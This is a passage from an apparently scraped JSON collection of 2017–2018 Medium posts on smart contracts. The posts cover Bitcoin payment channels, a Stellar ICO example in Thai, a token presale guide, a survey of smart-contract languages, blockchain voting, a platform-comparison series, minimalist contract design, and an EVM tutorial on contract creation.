to collaborate, or disappears, the consumer only needs to wait until the expiry time, and can claim the funds back. No risk.The other branch is more often used, and is a multisig 2-of-2 contract (as explained in the previous section) between the consumer and the provider. The consumer signs transactions using this branch, updating the amount sent to the provider as the channel progresses in time. These transactions are incomplete, because they have only 1 of the 2 signatures needed, and most never reach the blockchain. By repeatedly updating this transaction and sending it to the provider, the consumer is gradually sending more funds to the provider. The provider in turn can sign any of those transactions, achieving the needed amount of signatures, which allows it to be sent to the blockchain. If that happens, the channel is closed, and the contract ends.Payment channels have lots of potential and we\u2019ve only begun to see the applications. Some first attempts to explore this are Streamium, BitMesh, and PayFile.ConclusionSmart contracts allow to automate interactions between parties using code. It should be possible to create a script typification that improves how we talk about, think of, and develop smart contracts. One can then think of composing and combining different contracts to achieve more complex high-level behaviors (e.g Payment Channels use a multisig contract internally). A simple scheme will be proposed in a future post.As we saw, bitcoin offers a way to write code that controls money. Even though the scripting language is simple and limited, some pretty complex behaviors can be obtained. The initial examples shown above are very interesting on their own, but are just the beginning. It\u2019s only a matter of time until we see big chunks of institutions turned into code and become obsoleted.This is one of the biggest promises of bitcoin, and one that few people are talking about. This post is an attempt to expand the discussion to a wider audience.Follow me on twitter to get updates on my work on Smart Contracts.", "responses": "1"}, {"title": "Smart Contract on Stellar #1: \u0e15\u0e31\u0e27\u0e2d\u0e22\u0e48\u0e32\u0e07 ICO \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e23\u0e31\u0e1a\u0e1a\u0e23\u0e34\u0e08\u0e32\u0e04\u0e40\u0e07\u0e34\u0e19\u0e43\u0e2b\u0e49\u0e42\u0e23\u0e07\u0e1e\u0e22\u0e32\u0e1a\u0e32\u0e25\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e42\u0e1b\u0e23\u0e48\u0e07\u0e43\u0e2a\u0e41\u0e25\u0e30\u0e1b\u0e25\u0e2d\u0e14\u0e20\u0e31\u0e22", "author_name": "Methus Kaewsaikao", "link": "https://medium.com/cochain/smart-contract-on-stellar-%E0%B8%95%E0%B8%B1%E0%B8%A7%E0%B8%AD%E0%B8%A2%E0%B9%88%E0%B8%B2%E0%B8%87-ico-%E0%B9%80%E0%B8%9E%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%A3%E0%B8%B1%E0%B8%9A%E0%B8%9A%E0%B8%A3%E0%B8%B4%E0%B8%88%E0%B8%B2%E0%B8%84%E0%B9%80%E0%B8%87%E0%B8%B4%E0%B8%99%E0%B9%83%E0%B8%AB%E0%B9%89%E0%B9%82%E0%B8%A3%E0%B8%87%E0%B8%9E%E0%B8%A2%E0%B8%B2%E0%B8%9A%E0%B8%B2%E0%B8%A5%E0%B8%AD%E0%B8%A2%E0%B9%88%E0%B8%B2%E0%B8%87%E0%B9%82%E0%B8%9B%E0%B8%A3%E0%B9%88%E0%B8%87%E0%B9%83%E0%B8%AA%E0%B9%81%E0%B8%A5%E0%B8%B0%E0%B8%9B%E0%B8%A5%E0%B8%AD%E0%B8%94%E0%B8%A0%E0%B8%B1%E0%B8%A2-d32ac98ca457?source=search_post", "post_date": "Mar 4, 2018", "readtime": "4 min read", "upvotes": "209", "content": "Smart Contract on Stellar #1: \u0e15\u0e31\u0e27\u0e2d\u0e22\u0e48\u0e32\u0e07 ICO \u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e23\u0e31\u0e1a\u0e1a\u0e23\u0e34\u0e08\u0e32\u0e04\u0e40\u0e07\u0e34\u0e19\u0e43\u0e2b\u0e49\u0e42\u0e23\u0e07\u0e1e\u0e22\u0e32\u0e1a\u0e32\u0e25\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e42\u0e1b\u0e23\u0e48\u0e07\u0e43\u0e2a\u0e41\u0e25\u0e30\u0e1b\u0e25\u0e2d\u0e14\u0e20\u0e31\u0e22Methus KaewsaikaoBlockedUnblockFollowFollowingMar 4, 2018\u0e15\u0e31\u0e27\u0e25\u0e30\u0e04\u0e23\u0e43\u0e19\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e25\u0e30\u0e04\u0e23\u0e2a\u0e21\u0e21\u0e15\u0e34\u0e44\u0e21\u0e48\u0e40\u0e01\u0e35\u0e48\u0e22\u0e27\u0e02\u0e49\u0e2d\u0e07\u0e01\u0e31\u0e1a\u0e1a\u0e38\u0e04\u0e04\u0e25\u0e08\u0e23\u0e34\u0e07\u0e41\u0e15\u0e48\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e43\u0e14 \u0e42\u0e04\u0e49\u0e14\u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14\u0e16\u0e39\u0e01\u0e23\u0e31\u0e19\u0e17\u0e14\u0e2a\u0e2d\u0e1a\u0e1a\u0e19\u0e23\u0e30\u0e1a\u0e1a Stellar Testnet\u0e42\u0e04\u0e49\u0e14\u0e17\u0e31\u0e49\u0e07\u0e2b\u0e21\u0e14\u0e2d\u0e22\u0e39\u0e48\u0e1a\u0e19 https://github.com/methuz/stellar-hospital-tokenBlockchain \u0e41\u0e25\u0e30 ICO \u0e17\u0e35\u0e48\u0e01\u0e33\u0e25\u0e31\u0e07\u0e19\u0e34\u0e22\u0e21\u0e43\u0e19\u0e0a\u0e48\u0e27\u0e07\u0e19\u0e35\u0e49\u0e17\u0e33\u0e43\u0e2b\u0e49\u0e2b\u0e25\u0e32\u0e22\u0e04\u0e19\u0e21\u0e2d\u0e07\u0e27\u0e48\u0e32\u0e40\u0e1b\u0e47\u0e19\u0e40\u0e23\u0e37\u0e48\u0e2d\u0e07\u0e09\u0e32\u0e1a\u0e09\u0e27\u0e22\u0e2b\u0e23\u0e37\u0e2d\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e40\u0e01\u0e47\u0e07\u0e01\u0e33\u0e44\u0e23 \u0e22\u0e31\u0e07\u0e21\u0e35\u0e19\u0e49\u0e2d\u0e22\u0e04\u0e19\u0e17\u0e35\u0e48\u0e23\u0e31\u0e1a\u0e23\u0e39\u0e49\u0e02\u0e49\u0e2d\u0e14\u0e35\u0e17\u0e35\u0e48\u0e41\u0e17\u0e49\u0e08\u0e23\u0e34\u0e07\u0e02\u0e2d\u0e07\u0e21\u0e31\u0e19\u0e41\u0e25\u0e30\u0e23\u0e39\u0e49\u0e27\u0e48\u0e32\u0e21\u0e31\u0e19\u0e08\u0e30\u0e40\u0e1b\u0e25\u0e35\u0e48\u0e22\u0e19\u0e2d\u0e19\u0e32\u0e04\u0e15\u0e02\u0e2d\u0e07\u0e42\u0e25\u0e01\u0e43\u0e2b\u0e49\u0e14\u0e35\u0e02\u0e36\u0e49\u0e19\u0e44\u0e14\u0e49\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e44\u0e23 \u0e1c\u0e39\u0e49\u0e40\u0e02\u0e35\u0e22\u0e19\u0e08\u0e36\u0e07\u0e2d\u0e22\u0e32\u0e01\u0e17\u0e33\u0e0b\u0e35\u0e23\u0e35\u0e48\u0e2a\u0e4c\u0e02\u0e2d\u0e07\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21\u0e40\u0e1e\u0e37\u0e48\u0e2d\u0e1b\u0e23\u0e30\u0e22\u0e38\u0e01\u0e15\u0e4c\u0e43\u0e0a\u0e49 Blockchain \u0e43\u0e19\u0e41\u0e1a\u0e1a\u0e15\u0e48\u0e32\u0e07 \u0e46 \u0e43\u0e2b\u0e49\u0e40\u0e02\u0e49\u0e32\u0e01\u0e31\u0e1a\u0e2a\u0e16\u0e32\u0e19\u0e01\u0e32\u0e23\u0e13\u0e4c\u0e1a\u0e49\u0e32\u0e19\u0e40\u0e21\u0e37\u0e2d\u0e07\u0e02\u0e2d\u0e07\u0e1b\u0e23\u0e30\u0e40\u0e17\u0e28\u0e44\u0e17\u0e22 \u0e2b\u0e32\u0e01\u0e21\u0e35\u0e43\u0e04\u0e23\u0e2b\u0e23\u0e37\u0e2d\u0e2d\u0e07\u0e04\u0e4c\u0e01\u0e23\u0e43\u0e14\u0e21\u0e35\u0e44\u0e2d\u0e40\u0e14\u0e35\u0e22\u0e2b\u0e23\u0e37\u0e2d\u0e1b\u0e31\u0e0d\u0e2b\u0e32\u0e17\u0e35\u0e48\u0e2d\u0e22\u0e32\u0e01\u0e41\u0e01\u0e49\u0e44\u0e02 \u0e2b\u0e23\u0e37\u0e2d\u0e2d\u0e22\u0e32\u0e01\u0e43\u0e0a\u0e49\u0e07\u0e32\u0e19\u0e42\u0e1b\u0e23\u0e40\u0e08\u0e47\u0e04\u0e43\u0e19\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21 \u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e15\u0e34\u0e14\u0e15\u0e48\u0e2d\u0e41\u0e19\u0e30\u0e19\u0e33\u0e2b\u0e23\u0e37\u0e2d\u0e2a\u0e48\u0e07\u0e04\u0e33\u0e16\u0e32\u0e21\u0e40\u0e02\u0e49\u0e32\u0e21\u0e32\u0e44\u0e14\u0e49\u0e43\u0e19\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21\u0e19\u0e35\u0e49\u0e40\u0e23\u0e32\u0e08\u0e30\u0e43\u0e0a\u0e49 Stellar Lumen \u0e0b\u0e36\u0e48\u0e07\u0e40\u0e1b\u0e47\u0e19 Blockchain \u0e17\u0e35\u0e48\u0e43\u0e2b\u0e49\u0e40\u0e23\u0e32\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e17\u0e33\u0e01\u0e32\u0e23\u0e42\u0e2d\u0e19\u0e22\u0e49\u0e32\u0e22\u0e40\u0e07\u0e34\u0e19\u0e44\u0e14\u0e49\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e42\u0e1b\u0e23\u0e48\u0e07\u0e43\u0e2a\u0e41\u0e25\u0e30\u0e1b\u0e25\u0e2d\u0e14\u0e20\u0e31\u0e22 \u0e2d\u0e35\u0e01\u0e17\u0e31\u0e49\u0e07\u0e2a\u0e32\u0e21\u0e32\u0e23\u0e16\u0e2a\u0e23\u0e49\u0e32\u0e07\u0e23\u0e30\u0e1a\u0e1a Token \u0e41\u0e25\u0e30 Smart Contract \u0e44\u0e14\u0e49 \u0e1c\u0e21\u0e08\u0e30\u0e02\u0e2d\u0e22\u0e01\u0e15\u0e31\u0e27\u0e2d\u0e22\u0e32\u0e01\u0e23\u0e30\u0e1a\u0e1a\u0e01\u0e32\u0e23\u0e1a\u0e23\u0e34\u0e08\u0e32\u0e04\u0e17\u0e35\u0e48\u0e16\u0e39\u0e01\u0e40\u0e02\u0e35\u0e22\u0e19\u0e1a\u0e17\u0e04\u0e27\u0e32\u0e21\u0e44\u0e27\u0e49\u0e17\u0e35\u0e48 https://www.stellar.org/blog/multisig-and-simple-contracts-stellar/ \u0e41\u0e15\u0e48\u0e27\u0e48\u0e32\u0e40\u0e1b\u0e47\u0e19\u0e15\u0e31\u0e27\u0e2d\u0e22\u0e48\u0e32\u0e07\u0e17\u0e35\u0e48\u0e40\u0e01\u0e48\u0e32 \u0e44\u0e21\u0e48\u0e21\u0e35\u0e42\u0e04\u0e49\u0e14\u0e41\u0e25\u0e30\u0e44\u0e21\u0e48\u0e1b\u0e25\u0e2d\u0e14\u0e20\u0e31\u0e22\u0e40\u0e1e\u0e35\u0e22\u0e07\u0e1e\u0e2d\u0e21\u0e32\u0e17\u0e33\u0e01\u0e32\u0e23 Implement \u0e02\u0e36\u0e49\u0e19\u0e21\u0e32\u0e43\u0e2b\u0e21\u0e48", "responses": "3"}, {"title": "Guide to the Presale Smart\u00a0Contract", "author_name": "Ink Protocol", "link": "https://medium.com/@PayWithInk/guide-to-the-presale-smart-contract-751a00155320?source=search_post", "post_date": "Jan 18, 2018", "readtime": "4 min read", "upvotes": "635", "content": "Guide to the Presale Smart\u00a0ContractInk ProtocolBlockedUnblockFollowFollowingJan 18, 2018Technical guide and instructions for participating in the Ink Protocol presale.The Ink Protocol presale is approaching quickly, so we wanted to publish a technical guide about interacting with our Presale Smart Contract. We will be publishing more complete details about the entire process and current sale status soon as well. So stay tuned!Important TipsYou may only send funds from the Ethereum address that you specified in your presale registration.Do NOT send funds directly from a cryptocurrency exchange account (eg. Coinbase, Binance, etc).Do NOT send funds from any wallet that does not give you full control/visibility of your private key. Even if you are able to participate in the presale and claim tokens, your tokens will be inaccessible until your wallet updates to add support specifically for XNK.It is highly recommended that you use https://www.myetherwallet.com or https://metamask.io to transact with our Presale Smart Contract.", "responses": "4"}, {"title": "Smart Contract Languages Development to\u00a0Follow", "author_name": "Matt Suiche", "link": "https://blog.comae.io/smart-contract-languages-development-to-follow-992e30774b39?source=search_post", "post_date": "Dec 27, 2017", "readtime": "6 min read", "upvotes": "184", "content": "Smart Contract Languages Development to\u00a0FollowWhat languages I\u2019ll keep a close look at next year\u00a0(2018)Matt SuicheBlockedUnblockFollowFollowingDec 27, 2017If \u201ccrypto\u201d stands for cryptography\u2026 then, is my auto-correct right to call \u201ccryptocurrencies\u201d just \u201ccurrencies\u201d?Cryptocurrencies and blockchain made a lot of noise this year, good and bad. Smart contracts are finding new use cases (e.g. CryptoKitties), and some existing use case like multi-sig wallets (e.g. Parity) have been challenged due to their high complexity which introduced, like any piece of complex software, security vulnerabilities.I\u2019ll be covering some smart-contract languages that got my attention, and why I\u2019m gonna keep a close look at them next year. No doubt I forgot several languages, the list is nonexhaustive and I\u2019m looking forward your comments on Twitter.This year, Ethereum and its Virtual Machine (EVM) popularized the concept of smart contracts but also highlighted its potential risks. It is now common to hear criticism on EVM or its smart contract language, Solidity, for their complexity due to the several types of security vulnerability issues discovered this year in production deployed smart contracts.Back in February 2017, when I started working on Porosity, my decompiler and smart contract auditing tool for Ethereum smart-contracts, very few people (among those Martin H. Swende, OYENTE\u2019s team) looked at the potential risks of embedding smart contract software, written in a non formally verifiable language, on an immutable blockchain.Over the past few months, both Chain and Blockstream made an interesting announcement for smart-contract developments ecosystem.This month, Chain announced a Bitcoin Script extension of their smart contract language, Ivy, called to provide Bitcoin Script developers a high-level language to develop smart-contracts. Ivy already supported their Chain Protocol\u2019s Virtual Machine. This extension makes sense since even their internal documentation qualifies their instruction set as an extension of Bitcoin Script instruction sets, it\u2019s a smart move as it will probably also attract more developers to Chain Core next year.The CVM has some overlaps and similarities with Bitcoin Script, but adds instructions to support additional functionality, including loops, state transitions (through transaction introspection), and program evaluation.Russel O\u2019 Connor from Blockstream released his whitepaper for Simplicity, a native Merklized Abstract Syntax Trees (MASTs) programming language. Thanks to Dan Robinson from Chain, his recent blogpost is an excellent introduction to it, while announcing a potential extension of Ivy for Simplicity.Simplicity is designed to be small and efficient and is non-Turing-complete on purpose\u200a\u2014\u200amainly to stay away from potential security issues that have been hitting Ethereum smart-contracts until now. This design makes the language itself formally verifiable and even had been praised by functional programming language scientist Philip Wadler himself.Simplicity is a typed, combinator-based, functional language without loops and recursion, designed to be used for crypto-currencies and blockchain applications. It aims to improve upon existing crypto-currency languages, such as Bitcoin Script and Ethereum\u2019s EVM, while avoiding some of the problems they face. Simplicity comes with formal denotational semantics defined in Coq, a popular, general purpose software proof assistant. Simplicity also includes operational semantics that are defined with an abstract machine that we call the Bit Machine. The Bit Machine is used as a tool for measuring the computational space and time resources needed to evaluate Simplicity programs. Owing to its Turing incompleteness, Simplicity is amenable to static analysis that can be used to derive upper bounds on the computational resources needed, prior to execution. While Turing incomplete, Simplicity can express any finitary function, which we believe is enough to build useful \u201csmart contracts\u201d for blockchain applications.Several Ethereum smart-contracts have been described as \u201covercomplicated\u201d as we saw in the Parity issues, and we know with traditional software that large code base applications result in a larger attack surface and a higher rate of potential security vulnerabilities. Designing a simpler language is a better long-term plan way to introduce developers to adopt best practices rather than expecting them to make no mistakes.Although, the introduction of Web Assembly by eWASM, as an alternative to the EVM, on the Ethereum roadmap has been on my watch list for a while and I know several security researchers are highly expecting its release to hunt for more security bugs. WebAssembly is natively supported by JavaScript engines (Chakra, Spidermonkey, V8) but is extremely complicated and is a potential goldmine for attackers looking for vulnerabilities.Following its Elevence\u2019s acquisition, Digital Asset Holding announced its financial service (FS) industry focus smart contract language: Digital Asset Modeling Language (DAML)\u200a\u2014\u200aand its intent to open source it last year. I haven\u2019t been able to find the link, so they are still part of a long list of languages I\u2019m looking forward hearing more about\u200a\u2014\u200abut given their FS industry focus it makes them very attractive from a security point of view.Michelson for Tezos is another smart contract language designed to \u201cfacilitate formal verification\u201d, the Tezos team explains in a blogpost the main benefits of Michelson as the following:With Michelson you can more easily check over and verify properties of the program that is actually executed. Using a higher-level bytecode also simplifies the process of proving properties about the compiled output. Programs written in Michelson can be reasonably analyzed by SMT solvers and formalized in Coq without the need for more complicated techniques like separation logic. Similarly, the restrictions imposed by the forced indentation and capitalization ensure that the source cannot be obfuscated with indentation and alignment tricks.Although initially criticized to be hard to read, a higher level and fully typed functional language that compiles to Michelson, is now available: Liquidity. Michelson/Liquidity are designed with strict security requirements too. I\u2019m sure we will hear more about them too next year.Oh! I almost forgot, between Corda R3, Microsoft Coco Framework, MobileCoin & Tesseract there is an increasing number of projects marrying the Distributed Ledger Technology (DLT) world to Intel SGX. I\u2019m curious to see if we will see new types of attacks against SGX next year.EDIT (31 Dec, 2017):\u00a0CardanoAs I mentioned above I was sure I would forget some, or even not be aware of all of them as this space is moving a lot. IOHK\u2019s Cardano seems to be very promising too, mainly because of their recent partnership with the Runtime Verification team which is adding some very significant milestones to their 2018 roadmap.Runtime Verification team was initially behind a project called KEVM, the formal semantics of Ethereum VM they built using the K framework (whitepaper).Apparently, their research on EVM & K framework got the attention of IOHK since a few months later in October, the Runtime Verification (cool name btw) team announced that they have been awarded a research contract from IOHK to focus on a next-generation VM (IELE) and a universal language framework (K framework).They released two months later the first version of IELE, their Register-Based Virtual Machine, on Dec 15, 2017.This VM is the results of research Runtime Verification made on the EVM while working on KEVM, their semantics of EVM in K. As I mentioned EVM limitations have been highlighted numerous times, the emergence of new architectures for Blockchain Virtual Machines was only a matter of time and we will for sure see a lot of work in that area.\u201cIELE is a variant of LLVM specialized to execute smart contracts on the blockchain. Unlike the EVM, which is a stack-based machine, IELE is a register-based machine, like LLVM.\u201dAlong IELE, their research on K framework aims at providing smart-contract languages K semantics including IELE itself, Plutus (a strictly typed pure functional language for Cardano\u2019s smart-contracts) and even Solidity (which is currently used to develop smart-contracts on Ethereum).The Runtime Verification roadmap mentions very interesting milestones:Deploy IELE on the Cardano blockchain.Compilers/Translators from Solidity and Plutus to IELE.I\u2019m looking forward following RV team & IOHK team progress. IOHK\u2019s team is pretty interesting too they also recruited Dr. Philip Wadler himself, I\u2019d expect that to positively influence the development of K framework. Back in October, Charles Hoskinson also explained their roadmap in a very good video.Thanks to @arjyparjy & Gregg Dourgarian for pointing out IELE to me!", "responses": ""}, {"title": "Introducing the Social Smart\u00a0Contract", "author_name": "Democracy Earth", "link": "https://words.democracy.earth/introducing-the-social-smart-contract-8c7aa1d19682?source=search_post", "post_date": "Oct 6, 2017", "readtime": "8 min read", "upvotes": "813", "content": "Introducing the Social Smart\u00a0ContractDemocracy EarthBlockedUnblockFollowFollowingOct 6, 2017Presenting our most recent work under the light of the recent events in Catalunya.On Sunday October 1st the world watched in disbelief as the smart phone video footage streamed in from Catalonia, showing us Spanish national police outfitted like the military detail for an earthbound Darth Vader with faces hooded and helmeted and masked attempting, through the use of truncheons, rubber bullets and heavy body armor, to prevent Catalans from voting in a referendum the Spanish Prime Minister called illegal.Groups of ordinary people standing in line to vote can be seen cowering back against the walls as military-looking police smash their way into a voting precinct located in a school. They grab ballot boxes, using their truncheons liberally on men and women, young and old alike who stand or sit with their arms raised high in the air\u200a\u2014\u200amany of them singing\u200a\u2014\u200ain attestation that they are peaceful.The Democracy Earth Foundation was created in 2015 with the goal of creating a borderless, peer-to-peer democracy. It enables mobile, personally sovereign, incorruptible voting in situations just like Catalan, among many others. For the past two years we have been developing our open-source liquid democracy app Sovereign, launched pilots in Colombia and Hong Kong, researched the role of the internet in our geopolitical system, and took our digital democracy message to more than a dozen countries.The Social Smart Contract is the culmination of this work, an open-source document created by an international team of programmers, activists and researchers. In it, we present our Manifesto, Paper and Execution plan for a transnational network of liquid democracy, incorruptible blockchain-based voting, individual sovereignty, and cryptographically-induced equality.The Democracy earth mission has already been featured in New Scientist, Futurism, The Huffington Post and the World Economic Forum; now, under the light of Catalonia\u2019s events, we think it\u2019s a good timing for you to hear about it from us.In our Manifesto we covered the global political context with the internet becoming a dominant force and power being divided between The Land (national territories) and The Cloud (global corporations that monopolize access to user data), with citizens trapped in between. Our Paper describes the basic building blocks for a liquid governance system that can be implemented by anyone, anywhere. Finally, in Execution we specify how this system tackles the historical tension between money and power.", "responses": "3"}, {"title": "On the Origin of Smart Contract Platforms", "author_name": "Ed Posnak", "link": "https://medium.com/on-the-origin-of-smart-contract-platforms/on-the-origin-of-smart-contract-platforms-ff466b7bb839?source=search_post", "post_date": "Sep 26, 2017", "readtime": "4 min read", "upvotes": "469", "content": "On the Origin of Smart Contract PlatformsEd PosnakBlockedUnblockFollowFollowingSep 26, 2017The extinction of Colored Coins by Ethereum is one small step in the brief evolutionary history of cryptocurrency-based smart contract platforms. Recently this evolution has begun to accelerate with the emergence of new platforms and innovations in the ecosystem, leaving developers and speculators alike wondering which will survive and which will become extinct.For those investing their money or intellectual capital, keeping up with the torrent of innovation happening in the space can be time consuming. This series of articles will provide analyses of the emerging platforms and technologies in this ecosystem with a focus on their impact to the dominant species, currently Ethereum.At the present time Ethereum is thriving; it is the second most dominant coin by market cap, has a large and growing ecosystem of DApps, tools, developers, and corporations, and is the preferred home of initial coin offerings. Ethereum\u2019s short history also includes the DAO hack, a contentious hard fork that resulted in a permanent community split, and a Parity multisig wallet bug that put over 200 million USD at risk and resulted in permanent loss of ETH and other tokens.These events remind us that the dominance of a smart contracts platform delicately hinges on the security of its smart contracts. Research is being done in the Ethereum community on languages and tools to build safer smart contracts, but until these technologies see widespread deployment, Ethereum contracts will remain vulnerable to attack. Similarly, scalability is vital to Ethereum\u2019s success. Key innovations, such as proof of stake, sharding, sidechains, and off-chain computation are under active research and development, but still months to years away from deployment.Meanwhile, competing platforms, also in various stages of development, are innovating on languages, scaling, security, governance, and usability. They are testing out highly scalable consensus protocols, new paradigms of decentralized governance, and other promising advances. They enjoy the advantage of learning from Ethereum\u2019s experiences while making a clean start without billions of USD at risk. In most cases their efforts have been well funded by initial coin offerings, and there is no shortage of hype around them.\u201cOn the Origin of Smart Contract Platforms\u201d will be a series of articles that will track the emergence and evolution of competing smart contract platforms and try to predict their impact to the ecosystem. Each article will evaluate the technology of an emerging platform and assess the threat that the platform will come to dominate and extinguish the incumbent. This threat assessment is not so much a measure of the platform\u2019s innovativeness as it is an estimation of the potential for the platform\u2019s key innovations to displace the incumbent\u2019s network effects before it can adapt by assimilating these advances to preserve its dominance. Adapability for smart contract platforms depends on factors such as network effects, governance, and inertia and is the key to to survival in an ecosystem exploding with innovation.The threat of dominance posed by any emergent platform will change over time, often quickly and dramatically, as research progresses and influential events unfold. To capture the dynamic nature of this evolution, we\u2019ll assign each competitor an \u201cDominance Threat Level\u201d that estimates, at the present time, the platform\u2019s potential to supplant the incumbent as the dominant smart contracts platform. We\u2019ll use a color-coded scale (inspired by the the IUCN Red List) as described below:The Dominance Threat Level assigned to a project represents an educated guess based on information available at the present time and is expected to change. The analysis that goes into this threat assessment is limited by the author\u2019s experience and interests in computer science and engineering. Specifically, relevant factors such as a project\u2019s marketing strength, community, or financial condition are mostly ignored while technical white papers, mathematical proofs, and working code receive disproportionately more credit. In short, all conclusions in these articles are narrowly biased and therefore should not be construed in any way as investment advice.That said, I hope this information and analysis is useful to those who wish to understand and stay on top of developments in the rapidly evolving smart contracts technology space.So far, we\u2019ve covered Tezos, DFINITY, NEO, EOS, Cardano, Lisk, Qtum, and Waves. Stay tuned for articles on more competing platforms in the days to come.Thanks to Zero-Hour-Zulu for his input on early drafts and assistance in formulating the theme of this series.Thanks to Cyndi Conklin for the series logo designSpecial shout out to DecStack, the Virtual Co-Working Spot for CryptoCurrency and Decentralized App Projects, for their help and encouragement.If you\u2019d like to support this series with an ETH donation, please send it to 0x7e83982eb92502ad5d38c400ba2af7b135469ac9Your support allows and encourages me to devote more time to these articles is greatly appreciated.", "responses": "5"}, {"title": "The Joy of Minimalism in Smart Contract\u00a0Design", "author_name": "Rob Hitchens", "link": "https://medium.com/solidified/the-joy-of-minimalism-in-smart-contract-design-b67fb4073422?source=search_post", "post_date": "Apr 11, 2018", "readtime": "3 min read", "upvotes": "433", "content": "The Joy of Minimalism in Smart Contract\u00a0DesignRob HitchensBlockedUnblockFollowFollowingApr 11, 2018We all know blockchains and smart contracts provide unmatched assurances about unstoppable logic and immutable data. As attractive as that sounds, it\u2019s best to use it as sparingly as possible. A well-crafted, minimalist contract only addresses concerns that cannot be addressed any other way.\u201cIf a concern can possibly be addressed outside of a smart contract, then that\u2019s what we should do.\u201dThat may seem strange coming from someone who specializes in helping others maximize utility of smart contracts and blockchains. It\u2019s not a contradiction. Blockchains and smart contracts are an extraordinary solution. It\u2019s best to reserve it for extraordinary problems. Use it to create trust and resolve uncertainty\u200a\u2014\u200anothing routine.For example, if you merely want to award points, countless examples existed long before blockchain. On the other hand, if you want to prove that those points are always and will always be awarded by a disclosed formula, then you may need to make the formula an observable fact on the blockchain. That would be solving for trust in the meaning of the scores.This interpretation implies a narrow scope of concerns a smart contract should address. Contracts;define the essential, enduring facts about the application,provide the authoritative record of the facts that all participants can refer to in order to know they have the correct information, andprovide evidence of application integrity via immutable processes that prevent corruption in any form.With those concerns attended to, it\u2019s usually a good idea to make the complete state conveniently discoverable and completely auditable. Beyond these core concerns are details that can be attended to by clients.Consider the idea of sorting the data in the contract or finding a way to search it and filter it efficiently. It might be very useful, perhaps even critical to the overall solution. Even so, high importance doesn\u2019t imply that the implementation belongs at the smart contract level.Given that:the data in the contract is completely discoverable,state changes emit events in real time (they should), andclients can inspect the state, listen to events, or both,software clients can employ a range of strategies to discover the facts they need in any given moment. Minimalist contract design provides the toolbox for constructing an appropriate client-side implementation without attempting to do the software client\u2019s job. Indeed, the author would argue that client-side convenience shouldn\u2019t influence contract design.Whether it\u2019s a browser app or a massive cluster of caching servers, the contract\u2019s posture toward the outside world is the same.The state is completely discoverable.State changes are (should be) broadcast by event emitters.Any off-chain caching strategy is acceptable but the contract\u2019s version of the facts is always authoritative.Any off-chain query solution is acceptable.Any service that purports to perform these services can (and should) provide clients with all the necessary details clients would need to check the blockchain for themselves, if they want to.Knowing that a wide range of valid concerns will be attended to by off-chain processes greatly reduces the scope of functions that need to be coded inside a contract. A minimalist contract addresses only concerns that can\u2019t be addressed any other way.Minimalism leads to clarity about exactly what the contract needs to prove and the minimum logic and data required to construct the proof. Minimalism is the first defense against defects that might have non-trivial consequences. The ideal is something so simple that there are obviously no defects.\u201cObviously no defects\u201d is easier said than done, which is why an Audit and a Bug Bounty is an absolute must before any piece of software should be entrusted with significant value.When you\u2019re going for perfection, simple is better.", "responses": "1"}, {"title": "Diving Into The Ethereum VM Part 5\u200a\u2014\u200aThe Smart Contract Creation\u00a0Process", "author_name": "Howard", "link": "https://medium.com/@hayeah/diving-into-the-ethereum-vm-part-5-the-smart-contract-creation-process-cb7b6133b855?source=search_post", "post_date": "Oct 24, 2017", "readtime": "9 min read", "upvotes": "533", "content": "Diving Into The Ethereum VM Part 5\u200a\u2014\u200aThe Smart Contract Creation\u00a0ProcessHowardBlockedUnblockFollowFollowingOct 24, 2017In previous articles of this series, we\u2019ve learned the basics of EVM assembly, as well as how ABI encoding allows the outside world to communicate with a contract. In this article, we\u2019ll see how a contract is created from nothing.Previous articles of this series (in order).Introduction to the EVM assembly code.How fixed-length data types are represented.How dynamic data types are represented.How ABI Encodes External Method Calling.The EVM bytecode we\u2019ve seen so far is straightforward, just instructions that the EVM executes from top to bottom, no magic up its sleeve. The contract creation process is more fun, in that it blurs the barrier between code and data.In learning how a contract is created, we\u2019ll see that sometimes data is code, and sometimes code is data.Put on your favourite wizard hat \ud83c\udfa9A Contract\u2019s Birth CertificateLet\u2019s create a simple (and completely useless) contract:pragma solidity ^0.4.11;contract C {}Compile it:solc --bin --asm c.solAnd the bytecode is:60606040523415600e57600080fd5b5b603680601c6000396000f30060606040525b600080fd00a165627a7a723058209747525da0f525f1132dde30c8276ec70c4786d4b08a798eda3c8314bf796cc30029To create this contract, we\u2019ll need to create a transaction by making an eth_sendtransaction RPC call to an Ethereum node. You could use Remix or Metamask to do this.Whatever deployment tool you use, the parameters for the RPC call would be something similar to:{  \"from\": \"0xbd04d16f09506e80d1fd1fd8d0c79afa49bd9976\",  \"to\": null,  \"gas\": \"68653\", // 30400,  \"gasPrice\": \"1\", // 10000000000000  \"data\": \"0x60606040523415600e57600080fd5b603580601b6000396000f3006060604052600080fd00a165627a7a723058204bf1accefb2526a5077bcdfeaeb8020162814272245a9741cc2fddd89191af1c0029\"}There is no special RPC call or transaction type to create a contract. The same transaction mechanism is used for other purposes as well:Transferring Ether to an account or contract.Calling a contract\u2019s method with parameters.Depending on what parameters you specified, the transaction is interpreted differently by Ethereum. To create a contract, the to address should be null (or left out).I\u2019ve created the example contract with this transaction:https://rinkeby.etherscan.io/tx/0x58f36e779950a23591aaad9e4c3c3ac105547f942f221471bf6ffce1d40f8401Opening Etherscan, you should see that the input data for this transaction is the bytecode produced by the Solidity compiler:When processing this transaction, the EVM would have executed the input data as code. And voila, a contract was born.What The Bytecode Is\u00a0DoingWe can break the bytecode above into three separate chunks:// Deploy code60606040523415600e57600080fd5b5b603680601c6000396000f300// Contract code60606040525b600080fd00// 